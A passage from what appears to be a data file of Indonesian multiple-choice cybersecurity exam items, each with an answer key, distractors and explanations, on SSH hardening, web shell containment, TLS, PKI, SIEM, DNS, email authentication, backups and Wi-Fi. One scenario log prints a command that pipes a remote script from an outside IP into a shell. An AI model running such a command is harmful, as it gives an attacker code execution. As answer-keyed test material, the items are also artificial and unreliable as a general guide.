      'Menutup akses SSH port 22 langsung dari internet ke server database, menempatkan akses administratif di balik VPN/Zero-Trust Bastion Host (atau Session Manager) yang mewajibkan autentikasi kunci publik SSH + MFA, menyetel `PermitRootLogin no` dan `PasswordAuthentication no` pada `sshd_config`, serta membatasi IP sumber dan mencatat audit sesi.',
    pengecoh4: [
      'Cukup memindahkan port SSH publik dari 22 menjadi port 2222 sambil tetap mengizinkan `PermitRootLogin yes` dan login berbasis kata sandi dari seluruh alamat IP internet.',
      'Membiarkan port 22 terbuka ke internet pada server database tetapi mengganti kata sandi akun `root` setiap enam bulan sekali menggunakan kombinasi 8 huruf dan angka.',
      'Memasang skrip yang merestart daemon `sshd` setiap 10 menit sekali agar penyerang terputus di tengah percobaan brute-force tanpa mengubah konfigurasi autentikasi.',
      'Menghapus seluruh berkas `/var/log/auth.log` lewat cron job harian agar log percobaan brute-force tidak memenuhi partisi disk server database.',
    ],
    akarMasalah:
      'Eksposur langsung layanan manajemen (SSH port 22) pada server database ke internet dengan login root dan password membuka permukaan serangan brute-force dan kompromi langsung.',
    solusiTerbaik:
      'Menghapus eksposur publik + Bastion/VPN + MFA + key-based authentication (`PasswordAuthentication no`, `PermitRootLogin no`) + session auditing menghilangkan vektor brute-force publik secara struktural.',
    analisisPengecoh:
      'Memindah ke port 2222 hanya obscurity yang ditemukan port scanner dalam hitungan detik; mengandalkan password root pada port publik sangat berisiko; restart `sshd` berkala mengganggu admin sah dan tidak menutup celah; menghapus log justru menghancurkan visibilitas forensik.',
  },
  {
    level: 'C4',
    topik: 'Keamanan Siber - Deteksi Web Shell & Containment Insiden',
    pertanyaan:
      'Tim SOC menerima alert dari EDR dan log web server DMZ bahwa proses `www-data` (Apache/PHP) baru saja mengeksekusi perintah sistem mencurigakan dan melakukan koneksi keluar ke IP eksternal asing:\n\n```log\n[APACHE] 198.51.100.77 "POST /uploads/img_thumb.php HTTP/1.1" 200 412\n[AUDITD] uid=33(www-data) exe="/usr/bin/curl" cmd="curl -s http://203.0.113.99/p.sh | sh"\n[NET]    10.50.1.15:48220 -> 203.0.113.99:80 ESTABLISHED\n```\n\nBerdasarkan kerangka Incident Response (NIST SP 800-61), urutan tindakan pertama yang paling tepat pada fase *Containment* & *Forensic Preservation* adalah:',
    jawabanBenar:
      'Segera mengisolasi host terkompromi di level jaringan/VLAN (memutus egress ke IP asing dan akses lateral ke zona internal) tanpa langsung mematikan mesin secara kasar agar bukti volatil (RAM, proses aktif, koneksi jaringan, berkas `img_thumb.php`, dan log) dapat diakuisisi secara forensik sebelum fase eradikasi dan pembangunan ulang (rebuild) dari image bersih.',
    pengecoh4: [
      'Langsung menjalankan perintah `rm -rf /var/www/html/uploads/img_thumb.php` lalu membiarkan server tetap melayani trafik produksi normal tanpa memeriksa mekanisme persistensi atau kebocoran kredensial.',
      'Langsung mencabut kabel listrik server secara paksa dan memformat seluruh hard disk dalam 5 menit pertama agar malware hilang cepat tanpa menyisakan artefak forensik.',
      'Menghapus seluruh baris log Apache dan `auditd` yang mencatat aktivitas `www-data` agar auditor eksternal tidak menemukan indikasi bahwa server pernah disusupi.',
      'Mengirim balasan serangan balik (hack-back) ke alamat IP `203.0.113.99` dari server web produksi tersebut sebelum memutus koneksi jaringan keluarnya.',
    ],
    akarMasalah:
      'Unggahan berkas berbahaya (`img_thumb.php`) yang dapat dieksekusi di folder upload menyebabkan eksekusi kode jarak jauh (RCE/web shell) dan upaya pengunduhan payload lanjutan.',
    solusiTerbaik:
      'Network isolation menghentikan eksfiltrasi dan lateral movement seketika sambil menjaga memori/artefak volatil untuk investigasi akar penyebab, dilanjutkan eradikasi (rotasi seluruh secret/kredensial, penutupan celah upload) dan pemulihan dari golden image bersih.',
    analisisPengecoh:
      'Menghapus satu file PHP tidak menghapus backdoor persistensi/cron/SSH key yang mungkin sudah ditanam; format paksa menghancurkan bukti forensik dan menyembunyikan celah awal sehingga langsung diretas ulang; menghapus log melanggar hukum & tata kelola insiden; hack-back ilegal dan berisiko salah sasaran.',
  },
  {
    level: 'C5',
    topik: 'Keamanan Siber - Kriptografi Hibrida pada TLS 1.3 & Perfect Forward Secrecy',
    pertanyaan:
      'Seorang analis keamanan mengaudit konfigurasi server HTTPS portal perizinan dan menemukan server masih mengaktifkan protokol TLS 1.0/1.1 serta cipher suite `TLS_RSA_WITH_AES_256_CBC_SHA` (tanpa Ephemeral Diffie-Hellman). Pimpinan bertanya mengapa TLS 1.3 dengan ECDHE wajib diterapkan meski server sudah memakai kunci RSA 2048-bit.\n\nPenjelasan teknis manakah yang paling tepat mengevaluasi kelemahan konfigurasi lama tersebut?',
    jawabanBenar:
      'Pertukaran kunci RSA statis tidak menyediakan *Perfect Forward Secrecy (PFS)*: jika kunci privat sertifikat server bocor di masa depan, seluruh rekaman trafik terenkripsi yang pernah disadap di masa lalu dapat didekripsi ulang; TLS 1.3 mewajibkan pertukaran kunci ephemeral (`ECDHE`) dan enkripsi simetris AEAD (`AES-GCM`/`ChaCha20-Poly1305`) sehingga kunci sesi unik per koneksi tidak dapat dipulihkan meski kunci jangka panjang bocor.',
    pengecoh4: [
      'TLS 1.3 menghapus sepenuhnya penggunaan enkripsi simetris dan mengenkripsi seluruh payload HTTP menggunakan algoritma asimetris RSA-4096 secara langsung agar lebih aman.',
      'Kunci RSA 2048-bit sudah dipastikan dapat dipecahkan secara instan dalam 2 detik menggunakan komputer kantor biasa sehingga protokol TLS 1.3 menghilangkan kebutuhan sertifikat digital CA.',
      'Cipher suite mode CBC pada TLS 1.0 lebih lambat dibandingkan enkripsi Base64 pada TLS 1.3, meskipun keduanya memberikan tingkat kerahasiaan sesi historis yang sama.',
      'Perfect Forward Secrecy berarti server web menyimpan seluruh kunci sesi klien selama 5 tahun di basis data agar tim audit dapat mendekripsi trafik warga kapan saja.',
    ],
    akarMasalah:
      'TLS 1.0/1.1 rentan terhadap serangan downgrade dan padding oracle (CBC), serta key exchange RSA non-ephemeral tidak memiliki Perfect Forward Secrecy (PFS).',
    solusiTerbaik:
      'TLS 1.3 (dan TLS 1.2 minimal dengan `ECDHE` + AEAD) menjamin PFS melalui kunci ephemeral per sesi, menghilangkan cipher lemah (RC4, 3DES, CBC, SHA-1), dan mempercepat handshake menjadi 1-RTT.',
    analisisPengecoh:
      'TLS 1.3 tetap menggunakan kriptografi hibrida (asimetris untuk autentikasi/key exchange, simetris AEAD untuk enkripsi data); sertifikat CA tetap diperlukan untuk autentikasi server; Base64 bukan enkripsi; PFS justru berarti kunci sesi tidak dapat direkonstruksi pasca sesi berakhir.',
  },
  {
    level: 'C6',
    topik: 'Keamanan Siber - Tanda Tangan Digital Elektronik (BSrE) & Non-Repudiation',
    pertanyaan:
      'Pemerintah daerah mengimplementasikan Surat Keputusan (SK) Elektronik bertanda tangan digital menggunakan sertifikat elektronik terverifikasi (misal PSrE/BSrE). Pimpinan mensyaratkan dokumen PDF SK harus memenuhi tiga jaminan sekaligus: **otentisitas** (benar ditandatangani pejabat berwenang), **integritas** (terdeteksi bila diubah satu huruf pun), dan **nir-penyangkalan (*non-repudiation*)**.\n\nMekanisme kriptografi manakah yang tepat digunakan untuk membentuk dan memverifikasi tanda tangan digital tersebut?',
    jawabanBenar:
      'Menghitung digest kriptografi (SHA-256/SHA-512) dari isi dokumen lalu menandatangani digest tersebut menggunakan **kunci privat** milik pejabat (tersimpan aman di HSM/token tersertifikasi) beserta sertifikat X.509 & timestamp (TSA); pihak penerima memverifikasi dengan menghitung ulang hash dokumen dan memverifikasi tanda tangan menggunakan **kunci publik** pejabat yang tervalidasi rantai CA dan status pencabutannya (OCSP/CRL).',
    pengecoh4: [
      'Menghitung hash `MD5` dokumen lalu mengenkripsinya dengan **kunci publik** milik pejabat agar hanya pejabat tersebut yang bisa memverifikasi keabsahan tanda tangannya sendiri.',
      'Mengenkripsi seluruh berkas PDF menggunakan satu kunci simetris `AES-256` yang dibagikan kepada pejabat dan seluruh penerima dokumen agar tercipta jaminan nir-penyangkalan.',
      'Menempelkan gambar stempel PNG dan pindaian tanda tangan basah beresolusi 600 DPI ke halaman terakhir PDF lalu menguncinya dengan password baca PDF sepanjang 10 karakter.',
      'Menyimpan hash `SHA-256` dokumen di dalam metadata properti PDF tanpa kunci kriptografi apa pun sehingga setiap pembaca PDF otomatis mengetahui siapa pejabat penanda tangannya.',
    ],
    akarMasalah:
      'Tanpa kriptografi kunci publik berbasis PKI dan verifikasi rantai CA/revokasi, dokumen digital mudah dimodifikasi diam-diam dan dapat disangkal kepemilikannya.',
    solusiTerbaik:
      'Digital signature (hash + sign dengan kunci privat pejabat dalam PKI + verifikasi kunci publik + OCSP/CRL + TSA) secara matematis memenuhi otentisitas, integritas, dan nir-penyangkalan.',
    analisisPengecoh:
      'Enkripsi dengan kunci publik dipakai untuk kerahasiaan (confidentiality), bukan tanda tangan, dan MD5 rentan kolisi; enkripsi simetris tidak memberi *non-repudiation* karena penerima juga memegang kunci yang sama; gambar stempel/password PDF tidak memberikan bukti kriptografi; hash tanpa kunci privat dapat dihitung ulang oleh pemalsu.',
  },
  {
    level: 'C4',
    topik: 'Keamanan Siber - Validasi Rantai Sertifikat PKI & Revokasi (OCSP/CRL)',
    pertanyaan:
      'Seorang pejabat pengadaan melaporkan laptop dinasnya yang berisi sertifikat klien X.509 telah dicuri. Administrator PKI internal segera mencabut (*revoke*) sertifikat tersebut di Certificate Authority (CA). Namun dua hari kemudian, tim audit mendapati sertifikat yang sudah dicabut tersebut ternyata masih berhasil dipakai untuk autentikasi mTLS pada portal pengadaan.\n\nApa penyebab paling mungkin celah validasi tersebut dan perbaikannya?',
    jawabanBenar:
      'Server reverse proxy/aplikasi hanya memverifikasi tanda tangan CA dan tanggal kedaluwarsa (`NotAfter`) sertifikat tanpa memeriksa status pencabutan (*revocation check*); aktifkan verifikasi OCSP (Online Certificate Status Protocol) atau distribusi CRL (Certificate Revocation List) berkala pada TLS terminator, dan tetapkan kebijakan *hard-fail* (atau OCSP Stapling/masa berlaku sertifikat singkat) untuk akses kritikal.',
    pengecoh4: [
      'Mencabut sertifikat di CA memang tidak akan pernah berlaku sampai tanggal `NotAfter` pada sertifikat tersebut tercapai secara alami tiga tahun kemudian.',
      'Sertifikat klien X.509 tidak memiliki nomor seri unik sehingga CA tidak mungkin membedakan sertifikat pejabat yang dicuri dengan sertifikat pejabat lain.',
      'Administrator lupa menghapus seluruh Root CA instansi dari semua server produksi setiap kali ada satu sertifikat laptop pegawai yang hilang.',
      'Protokol mTLS secara rancangan hanya memeriksa nama pengguna di kolom `Common Name` tanpa pernah memvalidasi tanda tangan maupun status sertifikat.',
    ],
    akarMasalah:
      'Pencabutan di sisi CA hanya menerbitkan entri revokasi; bila server relying party (Nginx/HAProxy/API Gateway) tidak dikonfigurasi memeriksa OCSP/CRL, sertifikat curian tetap diterima hingga kedaluwarsa.',
    solusiTerbaik:
      'Mengaktifkan pengecekan CRL/OCSP aktif pada server mTLS (serta memperpendek masa berlaku sertifikat klien) memastikan sertifikat yang dicabut segera ditolak.',
    analisisPengecoh:
      'Revokasi justru dirancang membatalkan sertifikat sebelum `NotAfter`; setiap sertifikat X.509 memiliki `Serial Number` unik per CA; menghapus Root CA akan melumpuhkan seluruh sistem instansi; mTLS memvalidasi kriptografi penuh terhadap rantai sertifikat.',
  },
  {
    level: 'C5',
    topik: 'Keamanan Siber - Evaluasi WAF Virtual Patching vs Perbaikan Kode',
    pertanyaan:
      'Pada Jumat malam pukul 21.00 WIB, tim CSIRT menemukan kerentanan kritis *zero-day* injeksi perintah (RCE) pada komponen unggah berkas di portal layanan masyarakat yang dibangun oleh vendor eksternal. Vendor menyatakan perbaikan kode sumber dan pengujian regresi baru selesai pada Senin pagi. Portal tersebut melayani pendaftaran layanan darurat sehingga tidak boleh dimatikan penuh selama akhir pekan.\n\nStrategi penanganan risiko manakah yang paling tepat secara teknis dan operasional?',
    jawabanBenar:
      'Menerapkan *virtual patching* segera di Web Application Firewall (WAF) untuk memblokir pola payload eksploitasi spesifik dan membatasi endpoint unggah (dengan verifikasi agar tidak memicu false positive fatal), meningkatkan monitoring/alerting SIEM, serta tetap mewajibkan vendor merilis perbaikan permanen di kode sumber dan mengujinya pada Senin pagi.',
    pengecoh4: [
      'Menganggap rule WAF sebagai solusi permanen sehingga membatalkan permintaan patch kode sumber kepada vendor guna menghemat biaya pemeliharaan kontrak.',
      'Membiarkan portal tetap berjalan tanpa rule WAF maupun pembatasan akses selama akhir pekan karena jeda waktu 60 jam dianggap terlalu singkat bagi penyerang untuk menemukan celah.',
      'Mengaktifkan seluruh rule WAF secara acak dalam mode `Blocking` tanpa uji coba singkat lalu menutup semua akses tim CSIRT terhadap log WAF selama akhir pekan.',
      'Meminta seluruh pegawai mengganti warna tampilan halaman depan portal agar penyerang mengira sistem sedang dalam perbaikan dan menunda eksploitasi hingga Senin.',
    ],
    akarMasalah:
      'Terdapat jendela paparan aktif (60 jam) terhadap kerentanan RCE kritis sebelum patch kode sumber tersedia, sementara layanan darurat publik harus tetap beroperasi.',
    solusiTerbaik:
      'Virtual patching di WAF berfungsi sebagai kontrol kompensasi taktis yang cepat untuk menutup jendela eksploitasi sembari menunggu remedi permanen di kode aplikasi.',
    analisisPengecoh:
      'WAF dapat dilewati (*bypass*) oleh variasi encoding sehingga tidak boleh menggantikan patch kode permanen; pemindai otomatis mengeksploitasi zero-day dalam hitungan menit bukan hari; mode blocking acak tanpa validasi dan pemantauan berisiko memblokir warga sah; perubahan kosmetik UI tidak menghentikan serangan.',
  },
  {
    level: 'C4',
    topik: 'Keamanan Siber - Korelasi SIEM untuk Deteksi Lateral Movement',
    pertanyaan:
      'Analis SOC meninjau empat event terpisah yang secara individual tampak bernilai risiko rendah pada masing-masing sistem, tetapi terjadi berurutan dalam rentang 12 menit:\n\n```log\n01:02:11 [VPN-GW]  Login sukses akun "staf_umum" dari negara asing (anomali geolokasi)\n01:05:44 [WEB-INT] Akses beruntun 40 endpoint internal oleh "staf_umum" dari IP VPN\n01:08:19 [AD-DC]   Permintaan tiket layanan (Kerberos TGS) massal untuk 18 SPN server\n01:13:02 [DB-SRV]  Login SMB/WinRM gagal berulang lalu sukses memakai akun service "svc_backup"\n```\n\nPola aktivitas taktis apa yang ditunjukkan korelasi log tersebut dan tindakan respons prioritas utama?',
    jawabanBenar:
      'Rangkaian log menunjukkan intrusi aktif mulai dari kompromi akun awal (initial access via VPN), penemuan internal, upaya pengambilan kredensial layanan (*credential access*), hingga pergerakan lateral (*lateral movement*) menuju server basis data; segera cabut sesi VPN dan nonaktifkan sementara akun `staf_umum` & `svc_backup`, isolasi host terkait, lalu lakukan investigasi forensik dan rotasi kredensial terdampak.',
    pengecoh4: [
      'Aktivitas tersebut adalah rutinitas backup malam normal sehingga cukup menambahkan akun `staf_umum` ke daftar pengecualian (*whitelist*) SIEM agar alert tidak berbunyi lagi.',
      'Hanya menaikkan kompleksitas kata sandi akun `staf_umum` pada jadwal pergantian sandi triwulan depan karena serangan baru terbatas pada jaringan VPN.',
      'Mematikan fitur pencatatan log Kerberos pada Active Directory agar permintaan 18 SPN tersebut tidak membebani kapasitas penyimpanan SIEM.',
      'Cukup memblokir alamat IP VPN internal `staf_umum` tanpa mencabut sesi akun `svc_backup` karena akun service tidak mungkin digunakan oleh penyerang manusia.',
    ],
    akarMasalah:
      'Korelasi lintas sumber log (VPN + Web + AD + DB) mengungkap rantai intrusi multi-tahap (initial access -> credential access -> lateral movement) yang tidak terlihat jika setiap log hanya dinilai terpisah.',
    solusiTerbaik:
      'Respons terkoordinasi (pencabutan sesi aktif, penonaktifan/rotasi akun `staf_umum` dan `svc_backup`, isolasi segmen, serta perburuan artefak persistensi) menghentikan intrusi sebelum eksfiltrasi atau enkripsi ransomware.',
    analisisPengecoh:
      'Menjadikan anomali sebagai whitelist memberi jalan mulus bagi penyerang; menunda hingga triwulan depan berakibat kebocoran data penuh; mematikan log AD membutakan tim keamanan; penyerang justru sudah berhasil login memakai `svc_backup` sehingga akun tersebut wajib segera ditangani.',
  },
  {
    level: 'C6',
    topik: 'Keamanan Siber - Arsitektur Zero Trust & Mutual TLS (mTLS)',
    pertanyaan:
      'Kementerian sedang menata ulang keamanan jaringan internalnya karena arsitektur lama menganut model *castle-and-moat* (siapa pun yang sudah melewati firewall perimeter atau VPN dipercaya penuh mengakses semua layanan internal lewat HTTP biasa). Setelah satu laptop pegawai terinfeksi malware via email phishing, malware tersebut leluasa menyadap lalu lintas API internal dan memindai server keuangan.\n\nPrinsip dan implementasi arsitektur Zero Trust (NIST SP 800-207) manakah yang paling tepat untuk merombak infrastruktur tersebut?',
    jawabanBenar:
      'Menghilangkan kepercayaan implisit berbasis lokasi jaringan (*never trust, always verify*) dengan menerapkan autentikasi dan otorisasi kuat di setiap permintaan (identitas pengguna + postur keamanan perangkat + konteks risiko), mengenkripsi seluruh komunikasi antar-layanan internal menggunakan mTLS (mutual TLS), serta menegakkan mikrosegmentasi least-privilege antar-beban kerja.',
    pengecoh4: [
      'Memasang dua firewall perimeter merek berbeda secara seri di gerbang internet saja sementara tetap mempertahankan trafik HTTP plaintext dan akses terbuka penuh di seluruh jaringan internal.',
      'Menghapus seluruh akses VPN dan memindahkan semua aplikasi keuangan internal agar langsung dapat diakses publik melalui internet tanpa autentikasi perangkat.',
      'Mewajibkan pegawai memasukkan kata sandi Wi-Fi kantor yang sama sepanjang 32 karakter sekali saat masuk kerja, lalu memberikan akses penuh ke seluruh server tanpa pemeriksaan ulang.',
      'Menempatkan seluruh server aplikasi, database, dan workstation pegawai dalam satu VLAN besar agar IDS perimeter lebih mudah memantau seluruh paket dalam satu antarmuka.',
    ],
    akarMasalah:
      'Model perimeter tradisional (castle-and-moat) gagal membendung ancaman setelah perimeter tertembus (misal lewat phishing pada endpoint internal) karena trafik lateral internal tidak diverifikasi maupun dienkripsi.',
    solusiTerbaik:
      'Zero Trust (verifikasi eksplisit identitas + device posture + mTLS antar-layanan + mikrosegmentasi) mempersempit *blast radius* ke tingkat layanan terkecil bahkan saat satu endpoint internal terkompromi.',
    analisisPengecoh:
      'Menambah firewall perimeter tidak melindungi dari pergerakan lateral di dalam LAN; membuka aplikasi keuangan ke internet memperparah eksposur; autentikasi sekali via Wi-Fi tetap bersifat kepercayaan implisit; menyatukan semua aset ke satu VLAN menghancurkan segmentasi.',
  },
  {
    level: 'C5',
    topik: 'Keamanan Siber - Mitigasi DNS Amplification & Open Resolver',
    pertanyaan:
      'Tim keamanan menerima laporan dari CSIRT Nasional bahwa server DNS instansi (`103.40.10.5`) telah disalahgunakan sebagai pemantul (*reflector*) dalam serangan DDoS *DNS Amplification* ke pihak luar. Pemeriksaan konfigurasi BIND menunjukkan opsi `recursion yes;` dan `allow-query { any; };` aktif pada antarmuka IP publik.\n\nEvaluasi penyebab penyalahgunaan tersebut dan perbaikan konfigurasi paling tepat:',
    jawabanBenar:
      'Server bertindak sebagai *Open DNS Resolver* sehingga paket UDP dengan IP sumber palsu (spoofed) memicu balasan DNS berkali lipat lebih besar ke korban; pisahkan peran authoritative dan recursive DNS, setel `recursion no;` pada authoritative DNS publik (atau batasi `allow-recursion` hanya untuk CIDR internal instansi pada resolver privat), serta aktifkan *Response Rate Limiting (RRL)*.',
    pengecoh4: [
      'Menonaktifkan dukungan protokol TCP port 53 dan hanya mengizinkan UDP port 53 dari seluruh internet karena serangan DNS Amplification hanya dapat bekerja melalui koneksi TCP.',
      'Menaikkan ukuran buffer EDNS0 menjadi 4096 byte untuk seluruh kueri `ANY` dari internet agar server DNS lebih cepat melayani permintaan eksternal.',
      'Memindahkan layanan DNS otoritatif dari port 53 ke port 5353 di internet publik agar resolver global ISP tetap dapat mengakses domain `.go.id` tanpa terkena penyalahgunaan.',
      'Membiarkan `recursion yes;` terbuka untuk `any` namun menambahkan kapasitas CPU server DNS agar tidak melambat saat ikut memantulkan serangan DDoS.',
    ],
    akarMasalah:
      'Open recursive resolver di IP publik memanfaatkan sifat connectionless UDP untuk memantulkan dan melipatgandakan ukuran paket (faktor amplifikasi 20x–50x) menuju IP korban yang dipalsukan.',
    solusiTerbaik:
      'Mematikan rekursi pada authoritative DNS publik (`recursion no;`), membatasi resolver rekursif hanya untuk jaringan internal (`allow-recursion`), dan mengaktifkan RRL menutup vektor amplifikasi secara permanen.',
    analisisPengecoh:
      'DNS Amplification justru mengeksploitasi UDP (bukan TCP karena TCP membutuhkan 3-way handshake); memperbesar EDNS0/ANY justru memperbesar faktor amplifikasi; resolver global hanya mengkueri authoritative DNS di port standar 53; menambah CPU hanya membuat server menjadi pemantul serangan yang lebih kuat.',
  },
  {
    level: 'C4',
    topik: 'Keamanan Siber - Analisis Header Email SPF, DKIM & DMARC Anti-Phishing',
    pertanyaan:
      'Masyarakat mengeluhkan banyaknya email penipuan pengumuman CPNS yang memakai alamat pengirim palsu `pengumuman@instansi.go.id`. Audit DNS domain `instansi.go.id` menemukan konfigurasi berikut:\n\n```text\nTXT "v=spf1 ip4:103.40.10.20 ~all"\nTXT _dmarc "v=DMARC1; p=none; rua=mailto:dmarc@instansi.go.id"\nDKIM: belum dikonfigurasi\n```\n\nMengapa email pemalsuan domain (*domain spoofing*) masih lolos masuk ke kotak masuk masyarakat dan bagaimana strategi pengerasan bertahap yang tepat?',
    jawabanBenar:
      'Kebijakan `p=none` pada DMARC hanya bersifat memantau tanpa menolak email palsu, `~all` di SPF hanya softfail, dan DKIM belum aktif; aktifkan penandatanganan DKIM (minimal RSA 2048-bit) pada seluruh pengirim email sah, pantau laporan `rua` untuk memastikan seluruh sumber email resmi lolos alignment SPF/DKIM, lalu tingkatkan kebijakan DMARC secara bertahap dari `p=none` -> `p=quarantine` -> `p=reject` (serta perketat SPF ke `-all`).',
    pengecoh4: [
      'Mengubah record SPF menjadi `v=spf1 +all` agar seluruh mail server penerima di dunia mengetahui bahwa domain `instansi.go.id` menggunakan standar keamanan terbaru.',
      'Menghapus seluruh record `MX`, `SPF`, dan `DMARC` dari zona DNS publik supaya penyerang tidak mengetahui alamat IP mail server resmi instansi.',
      'Langsung mengubah `p=reject` tanpa mengaktifkan DKIM maupun memeriksa daftar aplikasi internal pengirim email (seperti newsletter/notif) karena email sah otomatis kebal terhadap DMARC.',
      'Mengganti protokol SMTP keluar pada mail server menjadi FTP terenkripsi karena protokol SMTP tidak mendukung verifikasi pengirim berbasis DNS.',
    ],
    akarMasalah:
      'Kebijakan DMARC `p=none` dan SPF `~all` tidak memerintahkan mail server penerima memblokir/mengarantina email yang gagal autentikasi domain, dan ketiadaan DKIM menghilangkan verifikasi tanda tangan kriptografi email.',
    solusiTerbaik:
      'Implementasi DKIM + pemantauan laporan agregat `rua` untuk memverifikasi alignment seluruh pengirim sah + transisi bertahap `p=quarantine` ke `p=reject` mencegah spoofing tanpa memblokir email dinas resmi.',
    analisisPengecoh:
      '`+all` justru mengizinkan seluruh IP di dunia mengirim email atas nama domain instansi; menghapus `MX`/`SPF`/`DMARC` mematikan penerimaan email dan memudahkan spoofing; melompat langsung ke `p=reject` tanpa audit `rua`/DKIM berisiko memblokir email resmi dari layanan pihak ketiga/aplikasi dinas; SMTP standar mendukung SPF/DKIM/DMARC/STARTTLS.',
  },
  {
    level: 'C5',
    topik: 'Keamanan Siber - Manajemen Risiko Ransomware & Backup Immutable (3-2-1-1-0)',
    pertanyaan:
      'Sebuah instansi daerah mengalami serangan ransomware yang mengenkripsi server virtualisasi utama sekaligus menghapus seluruh file backup karena server NAS backup terhubung langsung via SMB dengan akun Active Directory yang sama (*Domain Admin*) yang berhasil dikompromikan penyerang.\n\nEvaluasi celah arsitektur backup tersebut dan strategi pemulihan ketahanan (*cyber resilience*) manakah yang paling tepat?',
    jawabanBenar:
      'Backup gagal karena berada dalam domain autentikasi yang sama dan dapat dimodifikasi/dihapus secara online; terapkan strategi **3-2-1-1-0** dengan salinan backup **immutable** (WORM/Object Lock) atau **offline/air-gapped**, pisahkan kredensial dan manajemen identitas server backup sepenuhnya dari Active Directory produksi (dilengkapi MFA), serta lakukan uji pemulihan (*restore drill*) berkala.',
    pengecoh4: [
      'Menggunakan konfigurasi RAID 10 pada server produksi saja tanpa backup terpisah karena RAID 10 otomatis mencegah enkripsi ransomware melalui pencerminan disk real-time.',
      'Membayar uang tebusan kepada pelaku ransomware segera dan mematikan seluruh antivirus di server produksi agar pelaku bersedia memberikan kunci dekripsi.',
      'Menyimpan seluruh salinan backup di partisi `D:` pada server virtualisasi yang sama namun menyembunyikan folder tersebut dengan atribut `hidden` agar tidak terlihat ransomware.',
      'Mengandalkan sinkronisasi dua arah real-time ke cloud storage menggunakan akun admin yang login otomatis di server produksi agar perubahan file langsung tersalin seketika.',
    ],
    akarMasalah:
      'Shared credentials (Domain Admin) + akses tulis online (SMB) memungkinkan ransomware mengenkripsi atau menghapus repositori backup sebelum menuntut tebusan.',
    solusiTerbaik:
      'Strategi 3-2-1-1-0 (3 salinan, 2 media berbeda, 1 offsite, 1 immutable/air-gapped, 0 error pasca uji restore) + pemisahan IAM dari AD produksi memastikan pemulihan bersih tanpa membayar tebusan.',
    analisisPengecoh:
      'RAID hanya melindungi kegagalan perangkat keras disk, enkripsi ransomware langsung tereplikasi ke semua mirror; membayar tebusan melanggar tata kelola dan tidak menjamin data kembali/tidak bocor; folder hidden di disk lokal tetap dienkripsi ransomware; sinkronisasi real-time dua arah langsung menimpa salinan cloud dengan file terenkripsi.',
  },
  {
    level: 'C6',
    topik: 'Keamanan Siber - Evaluasi Keamanan Wireless Korporat (WPA3-Enterprise 802.1X)',
    pertanyaan:
      'Kantor pusat instansi memiliki 1.200 pegawai dan ratusan tamu harian. Saat ini Wi-Fi pegawai masih menggunakan satu kata sandi bersama (*WPA2-Personal / PSK*) yang jarang diganti, sehingga pegawai yang sudah mutasi/pensiun tetap bisa terhubung ke jaringan internal dari area parkir gedung dan berpotensi mengintip trafik Wi-Fi pegawai lain.\n\nRancangan arsitektur keamanan Wi-Fi korporat manakah yang paling tepat?',
    jawabanBenar:
      'Memigrasi SSID pegawai ke **WPA3-Enterprise (atau WPA2/WPA3-Enterprise) dengan IEEE 802.1X / RADIUS** menggunakan kredensial individual atau sertifikat perangkat (EAP-TLS) yang terintegrasi dengan direktori identitas (sehingga pencabutan akun pegawai mutasi langsung memutus akses), memisahkan SSID tamu pada VLAN terisolasi dengan *client isolation* & captive portal, serta mengaktifkan Protected Management Frames (802.11w).',
    pengecoh4: [
      'Menyembunyikan nama SSID (*Hidden SSID*) dan mengaktifkan *MAC Address Filtering* pada router Wi-Fi sambil tetap mempertahankan satu kata sandi WPA2-PSK bersama untuk seluruh 1.200 pegawai.',
      'Menurunkan daya pancar seluruh Access Point hingga 5% agar sinyal hanya menjangkau jarak 2 meter, tanpa mengubah autentikasi kata sandi bersama maupun pemisahan VLAN tamu.',
      'Mengubah SSID pegawai menjadi jaringan terbuka (*Open Wi-Fi*) tanpa enkripsi lalu hanya mengandalkan halaman login HTTP Captive Portal untuk melindungi seluruh trafik Wi-Fi internal.',
      'Membagikan satu kunci WEP 128-bit baru setiap hari Senin melalui papan pengumuman lobi gedung agar pegawai yang sudah pensiun tidak mengetahui kata sandi minggu tersebut.',
    ],
    akarMasalah:
      'WPA2-Personal (PSK bersama) tidak memiliki identitas per-pengguna sehingga tidak dapat mencabut akses individu tanpa mengganti sandi 1.200 perangkat dan rentan terhadap pemecahan offline handshake serta penyadapan lintas pengguna.',
    solusiTerbaik:
      'WPA3-Enterprise (802.1X/RADIUS, idealnya EAP-TLS berbasis sertifikat + PMF 802.11w) memberi kunci sesi unik per perangkat dan integrasi lifecycle IAM, sementara VLAN terisolasi + client isolation mengamankan segmen tamu.',
    analisisPengecoh:
      'Hidden SSID dan MAC filtering mudah di-sniff dan di-spoof dalam hitungan detik; menurunkan daya pancar merusak jangkauan kerja tanpa menyelesaikan shared PSK; Open Wi-Fi + HTTP Captive Portal tidak mengenkripsi trafik udara sehingga rentan penyadapan; WEP sudah rusak secara kriptografis dan dapat dipecahkan dalam menit.',
  },
  {
    level: 'C5',
    topik: 'Keamanan Siber - Privileged Access Management (PAM) & Just-in-Time Access',
    pertanyaan:
      'Audit internal menemukan 14 administrator TI dan 6 vendor pemeliharaan sama-sama menggunakan satu akun `root` / `Administrator` bersama (*shared privileged account*) dengan hak akses penuh permanen (24/7) pada 80 server kritikal. Ketika terjadi perubahan konfigurasi yang merusak layanan pada pukul 03.00 WIB, tidak seorang pun dapat memastikan siapa pelaku perubahan tersebut.\n\nKontrol manajemen identitas dan akses (IAM) manakah yang paling tepat untuk menyelesaikan celah akuntabilitas dan risiko penyalahgunaan ini?',
    jawabanBenar:
      'Mengimplementasikan **Privileged Access Management (PAM)** dengan akun personal bernomor identitas unik (menghapus penggunaan shared password langsung), menerapkan **Just-in-Time (JIT) access** berbatas waktu berbasis persetujuan tiket perubahan, rotasi otomatis kata sandi/kunci rahasia dalam vault pasca-sesi, serta perekaman sesi (*session recording*) dan audit log yang dikirim ke SIEM eksternal.',
    pengecoh4: [
      'Tetap memakai satu akun `root` bersama namun meminta ke-20 orang tersebut menulis nama dan jam akses secara sukarela di buku log kertas di depan ruang server.',
      'Memberikan hak akses permanen `root` kepada seluruh 20 akun individual tanpa batas waktu, tanpa MFA, dan tanpa perekaman sesi agar proses troubleshooting darurat tidak pernah terhambat.',
      'Memperpanjang panjang kata sandi akun `root` bersama menjadi 40 karakter lalu menyimpannya di berkas spreadsheet bersama di Google Drive tim operasional.',
      'Menghapus akun `root` lokal dan memberikan hak akses `Domain Admin` permanen hanya kepada vendor eksternal agar tanggung jawab insiden sepenuhnya berpindah ke pihak vendor.',
    ],
    akarMasalah:
